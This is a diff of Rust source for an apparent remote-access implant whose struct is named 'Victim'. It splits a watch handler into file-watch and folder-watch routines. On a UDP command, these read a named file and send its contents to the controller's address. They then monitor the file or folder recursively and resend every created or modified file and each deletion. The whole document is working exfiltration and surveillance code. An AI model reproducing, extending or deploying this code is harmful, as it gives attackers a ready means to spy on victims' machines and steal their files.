@@ -491,39 +491,21 @@ impl Victim {
         Ok(())
     }
 
-    // Replace handle_watch_start with this unified version
-    fn handle_watch_start(&mut self, payload: &[u8], udp: &UdpSocket, 
-                          cmd_addr: SocketAddr) -> io::Result<()> {
+    fn handle_file_watch_start(&mut self, payload: &[u8], udp: &UdpSocket, 
+                               cmd_addr: SocketAddr) -> io::Result<()> {
         if payload.is_empty() { return Ok(()); }
         
         let path_len = payload[0] as usize;
         if payload.len() < 1 + path_len { return Ok(()); }
         
-        let watch_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
-        let path = std::path::Path::new(&watch_path);
+        let file_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
         
-        // Check if path exists
-        if !path.exists() {
-            eprintln!("[!] Watch path does not exist: {}", watch_path);
-            return Ok(());
-        }
-        
-        // Dynamically detect if file or folder
-        let metadata = std::fs::metadata(path)?;
-        let is_dir = metadata.is_dir();
-        
-        println!("[*] Watching {} ({})", watch_path, if is_dir { "folder" } else { "file" });
-        
-        // Send initial content for files
-        if !is_dir {
-            if let Ok(data) = std::fs::read(path) {
-                const CHUNK_SIZE: usize = 1024;
-                for chunk in data.chunks(CHUNK_SIZE) {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
-                    thread::sleep(Duration::from_millis(50));
-                }
-                self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
+        if let Ok(data) = std::fs::read(&file_path) {
+            for chunk in data.chunks(CHUNK_SIZE) {
+                self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
+                thread::sleep(Duration::from_millis(50));
             }
+            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
         }
         
         let (tx, rx) = notify_channel();
@@ -532,148 +514,71 @@ impl Victim {
         let mut watcher = RecommendedWatcher::new(tx, Config::default())
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
         
-        // Use RecursiveMode based on file/folder
-        let recursive_mode = if is_dir { 
-            RecursiveMode::Recursive 
-        } else { 
-            RecursiveMode::NonRecursive 
-        };
-        
-        watcher.watch(path, recursive_mode)
+        watcher.watch(std::path::Path::new(&file_path), RecursiveMode::NonRecursive)
             .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
         
-        // Set appropriate active flag
-        if is_dir {
-            self.folder_watch_active = true;
-            self.folder_watch_path = Some(watch_path.clone());
-            self.folder_watch_stop_tx = Some(stop_tx);
-        } else {
-            self.file_watch_active = true;
-            self.file_watch_path = Some(watch_path.clone());
-            self.file_watch_stop_tx = Some(stop_tx);
-        }
+        self.file_watch_active = true;
+        self.file_watch_path = Some(file_path.clone());
+        self.file_watch_stop_tx = Some(stop_tx);
         
-        let watch_path_clone = watch_path.clone();
+        let file_path_clone = file_path.clone();
         let udp_clone = udp.try_clone()?;
-        let is_dir_clone = is_dir;
 
         thread::spawn(move || {
+            let mut last_size: u64 = 0;
             let mut last_send = Instant::now();
-
+            
+            if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
+                last_size = metadata.len();
+            }
+            
             loop {
                 if stop_rx.try_recv().is_ok() {
-                    println!("[*] Watch stopped for {}", watch_path_clone);
                     break;
                 }
-
+                
                 match rx.recv_timeout(Duration::from_millis(500)) {
                     Ok(Ok(event)) => {
-                        // Debounce - minimum 300ms between sends
-                        if last_send.elapsed() < Duration::from_millis(300) {
+                        if last_send.elapsed() < Duration::from_millis(500) {
                             continue;
                         }
-
-                        for changed_path in event.paths {
-                            // Skip directory events
-                            if changed_path.is_dir() {
-                                continue;
-                            }
-
-                            match event.kind {
-                                EventKind::Remove(_) => {
-                                    // Send delete notification
-                                    let relative = changed_path
-                                        .strip_prefix(&watch_path_clone)
-                                        .unwrap_or(&changed_path)
-                                        .to_string_lossy()
-                                        .trim_start_matches('/')
-                                        .to_string();
-                                    
-                                    let mut file_payload = Vec::new();
-                                    file_payload.push(relative.as_bytes().len() as u8);
-                                    file_payload.extend_from_slice(relative.as_bytes());
-                                    
-                                    let packet_type = if is_dir_clone { 
-                                        PACKET_TYPE_FOLDER_WATCH 
-                                    } else { 
-                                        PACKET_TYPE_FILE_WATCH 
-                                    };
-                                    let subtype = if is_dir_clone {
-                                        FOLDER_WATCH_FILE_DELETE
-                                    } else {
-                                        FILE_WATCH_DELETE
-                                    };
-                                    
-                                    let header = PacketHeader::new_raw(packet_type, subtype, file_payload.len() as u32);
-                                    let mut packet = Vec::with_capacity(HEADER_SIZE + file_payload.len());
-                                    packet.extend_from_slice(&header.to_bytes());
-                                    packet.extend_from_slice(&file_payload);
-                                    let _ = udp_clone.send_to(&packet, cmd_addr);
-                                    
-                                    println!("[!] File deleted: {}", relative);
-                                    last_send = Instant::now();
-                                }
+                        
+                        match event.kind {
+                            EventKind::Modify(_) | EventKind::Access(_) | EventKind::Create(_) => {
+                                thread::sleep(Duration::from_millis(300));
                                 
-                                EventKind::Modify(_) | EventKind::Create(_) => {
-                                    if changed_path.is_file() && changed_path.exists() {
-                                        thread::sleep(Duration::from_millis(200));
-                                        
-                                        if let Ok(data) = std::fs::read(&changed_path) {
-                                            let relative = changed_path
-                                                .strip_prefix(&watch_path_clone)
-                                                .unwrap_or(&changed_path)
-                                                .to_string_lossy()
-                                                .trim_start_matches('/')
-                                                .to_string();
-                                            
-                                            let packet_type = if is_dir_clone { 
-                                                PACKET_TYPE_FOLDER_WATCH 
-                                            } else { 
-                                                PACKET_TYPE_FILE_WATCH 
-                                            };
-                                            
-                                            if is_dir_clone {
-                                                // Folder watch - send path + data
-                                                let mut file_payload = Vec::new();
-                                                file_payload.push(relative.as_bytes().len() as u8);
-                                                file_payload.extend_from_slice(relative.as_bytes());
-                                                file_payload.extend_from_slice(&data);
-                                                
-                                                let subtype = if event.kind == EventKind::Create(_) {
-                                                    FOLDER_WATCH_FILE_CREATE
-                                                } else {
-                                                    FOLDER_WATCH_FILE_UPDATE
-                                                };
-                                                
-                                                let header = PacketHeader::new_raw(packet_type, subtype, file_payload.len() as u32);
-                                                let mut packet = Vec::with_capacity(HEADER_SIZE + file_payload.len());
+                                if let Ok(metadata) = std::fs::metadata(&file_path_clone) {
+                                    let new_size = metadata.len();
+                                    
+                                    if new_size != last_size {
+                                        if let Ok(data) = std::fs::read(&file_path_clone) {
+                                            for chunk in data.chunks(CHUNK_SIZE) {
+                                                let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, chunk.len() as u32);
+                                                let mut packet = Vec::with_capacity(HEADER_SIZE + chunk.len());
                                                 packet.extend_from_slice(&header.to_bytes());
-                                                packet.extend_from_slice(&file_payload);
-                                                let _ = udp_clone.send_to(&packet, cmd_addr);
-                                            } else {
-                                                // File watch - send chunks
-                                                const CHUNK_SIZE: usize = 1024;
-                                                for chunk in data.chunks(CHUNK_SIZE) {
-                                                    let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, chunk.len() as u32);
-                                                    let mut packet = Vec::with_capacity(HEADER_SIZE + chunk.len());
-                                                    packet.extend_from_slice(&header.to_bytes());
-                                                    packet.extend_from_slice(chunk);
-                                                    let _ = udp_clone.send_to(&packet, cmd_addr);
-                                                }
-                                                // Terminator packet
-                                                let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, 0);
-                                                let mut packet = vec![0u8; HEADER_SIZE];
-                                                packet.copy_from_slice(&header.to_bytes());
+                                                packet.extend_from_slice(chunk);
                                                 let _ = udp_clone.send_to(&packet, cmd_addr);
                                             }
                                             
-                                            println!("[*] File changed: {} ({} bytes)", relative, data.len());
+                                            let header = PacketHeader::new_file_watch(FILE_WATCH_UPDATE, 0);
+                                            let mut packet = vec![0u8; HEADER_SIZE];
+                                            packet.copy_from_slice(&header.to_bytes());
+                                            let _ = udp_clone.send_to(&packet, cmd_addr);
+                                            
+                                            last_size = new_size;
                                             last_send = Instant::now();
                                         }
                                     }
                                 }
-                                _ => {}
                             }
+                            EventKind::Remove(_) => {
+                                let header = PacketHeader::new_file_watch(FILE_WATCH_DELETE, 0);
+                                let mut packet = vec![0u8; HEADER_SIZE];
+                                packet.copy_from_slice(&header.to_bytes());
+                                let _ = udp_clone.send_to(&packet, cmd_addr);
+                                break;
+                            }
+                            _ => {}
                         }
                     }
                     Ok(Err(e)) => {
@@ -686,9 +591,151 @@ impl Victim {
                 }
             }
         });
+        
+        Ok(())
+    }
+
+    fn handle_file_watch_stop(&mut self, _payload: &[u8]) {
+        if let Some(tx) = self.file_watch_stop_tx.take() {
+            let _ = tx.send(());
+        }
+        self.file_watch_active = false;
+        self.file_watch_path = None;
+    }
+
+    fn handle_folder_watch_start(&mut self, payload: &[u8], udp: &UdpSocket, 
+                                 cmd_addr: SocketAddr) -> io::Result<()> {
+        if payload.is_empty() { return Ok(()); }
+        
+        let path_len = payload[0] as usize;
+        if payload.len() < 1 + path_len { return Ok(()); }
+        
+        let folder_path = String::from_utf8_lossy(&payload[1..1+path_len]).to_string();
+
+        let (tx, rx) = notify_channel();
+        let (stop_tx, stop_rx) = mpsc::channel::<()>();
+        
+        let mut watcher = RecommendedWatcher::new(tx, Config::default())
+            .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+        
+        watcher.watch(std::path::Path::new(&folder_path), RecursiveMode::Recursive)
+            .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+        
+        self.folder_watch_active = true;
+        self.folder_watch_path = Some(folder_path.clone());
+        self.folder_watch_stop_tx = Some(stop_tx);
+
+        let folder_path_clone = folder_path.clone();
+        let udp_clone = udp.try_clone()?;
+
+        thread::spawn(move || {
+            let mut last_send = Instant::now();
+            
+            loop {
+                if stop_rx.try_recv().is_ok() {
+                    break;
+                }
+
+                match rx.recv_timeout(Duration::from_millis(500)) {
+                    Ok(Ok(event)) => {
+                        if last_send.elapsed() < Duration::from_millis(500) {
+                            continue;
+                        }
+
+                        for path in event.paths {
+                            let relative_path = path.strip_prefix(&folder_path_clone)
+                                .unwrap_or(&path)
+                                .to_string_lossy()
+                                .trim_start_matches('/')
+                                .to_string();
+
+                            match event.kind {
+                                EventKind::Create(_) => {
+                                    if path.is_file() {
+                                        thread::sleep(Duration::from_millis(300));
+                                        if let Ok(data) = std::fs::read(&path) {
+                                            let mut file_payload = Vec::new();
+                                            file_payload.push(relative_path.as_bytes().len() as u8);
+                                            file_payload.extend_from_slice(relative_path.as_bytes());
+                                            file_payload.extend_from_slice(&data);
+                                            
+                                            let header = PacketHeader::new_folder_watch(
+                                                FOLDER_WATCH_FILE_CREATE,
+                                                file_payload.len() as u32
+                                            );
+                                            let mut packet = Vec::with_capacity(HEADER_SIZE + file_payload.len());
+                                            packet.extend_from_slice(&header.to_bytes());
+                                            packet.extend_from_slice(&file_payload);
+                                            let _ = udp_clone.send_to(&packet, cmd_addr);
+                                            
+                                            last_send = Instant::now();
+                                        }
+                                    }
+                                }
+                                EventKind::Modify(_) => {
+                                    if path.is_file() {
+                                        thread::sleep(Duration::from_millis(300));
+                                        if let Ok(data) = std::fs::read(&path) {
+                                            let mut file_payload = Vec::new();
+                                            file_payload.push(relative_path.as_bytes().len() as u8);
+                                            file_payload.extend_from_slice(relative_path.as_bytes());
+                                            file_payload.extend_from_slice(&data);
+                                            
+                                            let header = PacketHeader::new_folder_watch(
+                                                FOLDER_WATCH_FILE_UPDATE,
+                                                file_payload.len() as u32
+                                            );
+                                            let mut packet = Vec::with_capacity(HEADER_SIZE + file_payload.len());
+                                            packet.extend_from_slice(&header.to_bytes());
+                                            packet.extend_from_slice(&file_payload);
+                                            let _ = udp_clone.send_to(&packet, cmd_addr);
+                                            
+                                            last_send = Instant::now();
+                                        }
+                                    }
+                                }
+                                EventKind::Remove(_) => {
+                                    let mut file_payload = Vec::new();
+                                    file_payload.push(relative_path.as_bytes().len() as u8);
+                                    file_payload.extend_from_slice(relative_path.as_bytes());
+                                    
+                                    let header = PacketHeader::new_folder_watch(
+                                        FOLDER_WATCH_FILE_DELETE,
+                                        file_payload.len() as u32
+                                    );
+                                    let mut packet = Vec::with_capacity(HEADER_SIZE + file_payload.len());
+                                    packet.extend_from_slice(&header.to_bytes());
+                                    packet.extend_from_slice(&file_payload);
+                                    let _ = udp_clone.send_to(&packet, cmd_addr);
+                                    
+                                    last_send = Instant::now();
+                                }
+                                _ => {}
+                            }
+                        }
+                    }
+                    Ok(Err(e)) => {
+                        eprintln!("[folder watch error] {:?}", e);
+                    }
+                    Err(mpsc::RecvTimeoutError::Timeout) => {}
+                    Err(mpsc::RecvTimeoutError::Disconnected) => {
+                        break;
+                    }
+                }
+            }
+        });
 
         Ok(())
-    }    
+    }
+
+    fn handle_folder_watch_stop(&mut self, _payload: &[u8]) {
+        if let Some(tx) = self.folder_watch_stop_tx.take() {
+            let _ = tx.send(());
+        }
+        self.folder_watch_active = false;
+        self.folder_watch_path = None;
+    }
+
     fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
                      ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {
         let content_str = String::from_utf8_lossy(content);
